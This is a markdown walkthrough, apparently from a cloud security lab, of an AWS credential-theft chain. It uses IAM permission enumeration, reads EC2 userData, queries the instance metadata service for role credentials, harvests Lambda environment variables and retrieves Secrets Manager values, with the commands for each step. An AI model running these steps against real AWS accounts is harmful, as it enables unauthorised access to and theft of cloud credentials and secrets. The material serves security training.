------------

### Enumerating Secrets

------------

- Enumeratepermissions of a user in AWS with [enumerate_iam.py](https://github.com/andresriancho/enumerate-iam/tree/master)

```bash
./enumerate-iam.py --access-key  AKIA --secret-key 6Zl97e
```

<img width="1410" height="350" alt="image" src="https://github.com/user-attachments/assets/b8e1527d-878d-42d8-adbb-641da9fce414" />

- We have access to ec2 `describe_tags` and `describe_instances` permissions which can allow instances enumeration.Note tht you have to specify the region to get more info on instances.e.g

```bash
aws ec2 describe-instances --region us-east-1 --profile <p> | jq
```
- I am trying to work on query usage so I used this to pick the instanceid and metadata.

```bash
aws ec2 describe-instances --region us-east-1 --profile bob --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress]"  | jq
```

<img width="1425" height="218" alt="image" src="https://github.com/user-attachments/assets/3d01a5ad-8b86-4404-a93c-b0d11d7efc34" />

- Inspecting an ec2 instance metadata-:

> According to the docs, `--attribute` can date more values but userData fits our prescription
```bash
aws ec2 describe-instance-attribute --instance-id i-* --attribute userData --region us-east-1  --profile bob | jq
```

<img width="1897" height="366" alt="image" src="https://github.com/user-attachments/assets/26da1535-d1b0-4d5a-9229-a45018cb6676" />

- Ssh access-:

<img width="1102" height="365" alt="image" src="https://github.com/user-attachments/assets/a14f5854-e972-4550-b1ca-8a3d89150fe7" />

- Querying `IMDS`->
>Every EC2 instance has access to the instance metadata service (IMDS) that contains metadata and information about that specific EC2 instance. In addition, if an IAM Role is associated with the EC2 instance, credentials for that role will be in the metadata service. Because of this, the instance metadata service is a prime target for attackers who gain access to an EC2 instance.

- First stop is to make a request to the IAM role associated with the credentials-:

```
#role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
#credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/*role_name*/
```

<img width="1889" height="320" alt="image" src="https://github.com/user-attachments/assets/498de384-140b-4291-ac64-61d2e1af8a1c" />

- Configure the new credentials like this but first IAM credentials are divided into the `Long-term` and `short-term` ones.
- Long term credentials will have an access key that starts with AKIA and will be 20 characters long. In addition to the access key there will also be a secret access key which is 40 characters long. With these two keys, you can potentially make requests against the AWS API. As the name implies, these credentials have no specified lifespan and will be useable until they are intentionally disabled/deactivated. As a result, this makes them not recommended from a security perspective. Temporary security credentials are preferred.
- Temporary credentials, by comparison, will have an access key that starts with ASIA, be 20 characters long, and also have a 40 character secret key. In addition, temporary security credentials will also have a session token (sometimes referred to as a security token). The session token will be base64 encoded and quite long. With these 3 credentials combined you can potentially make requests to the AWS API. As the name implies, these credentials have a temporary lifespan that is determined when they were created. It can be as short as 15 minutes, and as long as several hours.
- Configuring Long and temporary ones-:

```
# long
export AWS_ACCESS_KEY_ID=AKIAEXAMPLEEXAMPLEEE
export AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM
# short
export AWS_ACCESS_KEY_ID=ASIAEXAMPLEEXAMPLEEE
export AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM
export AWS_SESSION_TOKEN=EXAMPLEEXAMPLEEXAMPLE...<snip>
```

- Then, you should finally configure region with `aws configure --profile <p>`. Note it `us-east-1`

<img width="1657" height="350" alt="image" src="https://github.com/user-attachments/assets/02cad827-82df-4819-bdaa-abf514e02391" />

- Listing lambda functions grant us another creds in env variable-:

```bash
aws lambda list-functions
```

<img width="1486" height="655" alt="image" src="https://github.com/user-attachments/assets/d8837cc8-2b80-4c1d-b3bf-42e3a1d63129" />

- Querying Secretsmanager-:

```bash
aws secretsmanager list-secrets --profile root
```

<img width="1243" height="559" alt="image" src="https://github.com/user-attachments/assets/2b452577-a5a4-48c2-b44d-1d9eef97f173" />

- Grabbing a secret's value with secret's name-:

```bash
aws secretsmanager get-secret-value --secret-id "secretName"
```

<img width="1451" height="281" alt="image" src="https://github.com/user-attachments/assets/e9088d35-c540-4d4f-bd9d-93a3b69529bb" />






